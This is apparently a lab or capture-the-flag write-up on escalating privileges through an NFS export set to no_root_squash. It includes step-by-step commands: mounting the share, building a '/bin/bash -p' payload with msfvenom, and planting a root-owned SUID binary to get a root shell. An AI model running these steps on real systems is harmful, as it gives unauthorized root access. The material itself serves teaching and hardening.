## NFS Root Squashing Misconfiguration

### What is NFS?

**NFS (Network File System)** allows a Linux system to share directories over a network.

A client can mount a directory exported by an NFS server:

```text
NFS Server
    │
    │ Network
    ↓
NFS Client
    │
    └── Mounted directory
```

One important security property of NFS is that file ownership is generally represented using **UID/GID values**.

---

## Root Squashing

NFS has a security feature called **root squashing**.

When enabled, requests from the remote **root user (UID 0)** are mapped to an unprivileged account, commonly:

```text
nobody
```

This prevents a root user on an NFS client from creating files that are owned by root on the NFS server.

### With root squashing

```text
Kali root
   ↓
NFS server
   ↓
File created as nobody
```

### Without root squashing

```text
Kali root
   ↓
NFS server
   ↓
File created as root
```

Therefore, disabling root squashing can be dangerous when the exported directory is writable.

---

# Identifying the Misconfiguration

On the Debian target:

```bash
cat /etc/exports
```

Look for an NFS export similar to:

```text
/tmp *(rw,sync,no_root_squash)
```

The important option is:

```text
no_root_squash
```

This means that root privileges from an NFS client are **not mapped to `nobody`**.

Therefore, a root user on the client can potentially create **root-owned files** on the exported filesystem.

---

# Exploitation

### 1. Become Root on Kali

On Kali:

```bash
sudo su
```

The attack requires root privileges on the NFS client because the goal is to create a root-owned SUID file.

---

### 2. Mount the NFS Share

Create a mount point:

```bash
mkdir /tmp/nfs
```

Mount the target's `/tmp` share:

```bash
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

After mounting:
```text
Debian:
/tmp
  ↕
NFS
  ↕
Kali:
/tmp/nfs
```

Files created under:
```text
/tmp/nfs
```

are actually being created inside the Debian machine's:
```text
/tmp
```

---

## 3. Create a Payload

The lab uses `msfvenom` to generate an ELF executable:
```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

The important part is:
```text
/bin/bash -p
```
The `-p` option tells Bash to preserve its effective privileges.

---

## 4. Set SUID

Make the payload executable and set the SUID bit:

```bash
chmod +xs /tmp/nfs/shell.elf
```

Because the NFS export has:
```text
no_root_squash
```

the file can retain **root ownership**.

Conceptually:
```text
Kali root
    ↓
Create shell.elf
    ↓
File is root-owned
    ↓
chmod +xs
    ↓
Root-owned SUID executable
    ↓
Visible on Debian
```

---

# Execute on the Target

Back on Debian, as the low-privileged user:
```bash
/tmp/shell.elf
```

The file is root-owned and has the SUID permission.

Therefore:
```text
Low-privileged user
       ↓
/tmp/shell.elf
       ↓
SUID
       ↓
Runs with root effective UID
       ↓
/bin/bash -p
       ↓
Root shell
```

---

# Attack Chain
```text
NFS export
    ↓
no_root_squash
    ↓
Kali root mounts /tmp
    ↓
Create malicious ELF
    ↓
File becomes root-owned
    ↓
Set SUID bit
    ↓
File appears on Debian /tmp
    ↓
Low-privileged user executes it
    ↓
Root shell
```

---

## Why This Works

The vulnerability is **not simply that NFS is enabled**.

The dangerous combination is:

```text
Writable NFS share
        +
no_root_squash
        +
Attacker has root on NFS client
        +
SUID enabled on created file
```

This allows a remote root user to create a **root-owned SUID executable** on the server.

---

### Key Takeaway

> **`no_root_squash` can allow root on an NFS client to create root-owned files on the NFS server. If the share is writable, this can be abused to create a root-owned SUID executable and escalate privileges.**

---

# Using a Compatible Executable To priv esc

In a controlled lab, you may use an executable compatible with the target system.

For example, if the lab specifically requires a Bash binary, obtain a copy from the target:
```bash
scp -i id_rsa username@TARGET_IP:/bin/bash ~/Downloads/bash
```

Now:
```text
~/Downloads/bash
```

contains the executable.

Copy it into the mounted export:
```bash
cp ~/Downloads/bash /tmp/mount/USERNAME/
```

Verify:
```bash
ls -l /tmp/mount/USERNAME/bash
```

# Setting Root Ownership and SUID

If the NFS export is writable and `no_root_squash` is enabled, a root user on the client may be able to change the ownership and permissions of the file:

```bash
sudo chown root:root /tmp/mount/USERNAME/bash
sudo chmod +s /tmp/mount/USERNAME/bash
```

Verify:
```bash
ls -l /tmp/mount/USERNAME/bash
```

You may see:
```text
-rwsr-xr-x 1 root root ... bash
```

The important parts are:
```text
root root
```

and:
```text
rws
```
The `s` indicates that SUID is enabled.

# Accessing the SUID Executable

Connect to the target:
```bash
ssh -i id_rsa username@TARGET_IP
```

Navigate to the directory:
```bash
cd /home/USERNAME
```

Verify:
```bash
ls -l bash
```

If the permissions remain:
```text
-rwsr-xr-x
```

the SUID bit has been preserved.

In a controlled lab, the executable can then be invoked according to the lab's intended privilege-escalation exercise. For Bash specifically, `-p` is commonly used because it tells Bash to preserve privileged execution instead of dropping privileges.

```bash
./bash -p
```

Then verify the effective identity:
```bash
whoami
```

Expected in the vulnerable lab:
```text
root
```

# Complete Attack Chain
```
                NFS
                 │
                 ▼
        Enumerate exports
                 │
                 ▼
       Find writable export
                 │
                 ▼
        Check /etc/exports
                 │
                 ▼
          no_root_squash
                 │
                 ▼
        Mount NFS share
                 │
                 ▼
       Access exported files
                 │
                 ▼
     Place compatible executable
                 │
                 ▼
       root-owned + SUID
                 │
                 ▼
       Execute on the target
                 │
                 ▼
         Elevated privileges
```

## One-Line Summary
> **NFS privilege escalation commonly occurs when a writable export uses `no_root_squash`, allowing a root user on the client to create root-owned files on the server and potentially abuse privileged executables.**